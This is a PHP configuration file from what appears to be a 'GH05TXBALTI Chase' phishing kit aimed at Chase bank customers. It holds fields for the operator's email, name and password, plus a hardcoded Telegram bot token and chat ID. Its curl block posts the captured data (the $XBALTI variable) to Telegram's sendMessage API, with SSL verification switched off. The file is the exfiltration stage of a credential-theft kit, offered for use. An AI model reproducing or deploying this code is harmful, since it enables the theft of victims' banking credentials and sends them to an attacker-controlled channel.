<?php


/*"==============|| 🥂 GH05TXBALTI Chase V5.6 ( V6 ) Beta 🥂 ||==============   
 XBALTI V6 MODD3D EDITION GH05T3MP      
*////==============|| 🥂 GH05TXBALTI Chase V5.6 ( V6 ) Beta 🥂 ||==============

$XBALTI_EMAIL = "@EMAIL.COM"; // Your Email Here :)

$yourname = "GH05T"; // Your Name Here :)

$yourpass = "3MP "; // Your Password Here :)
//////////////// Telegram mode 
$botToken='1741739560:AAG9sn2fJ15pMgOqdR0Rt40NaZwh6BhjcCs'; // Your bot ID:TOKEN 
$chatId='-557827205';  // Your Telegram ID 
  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$XBALTI,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
  /////////////////////////////////////////
?>

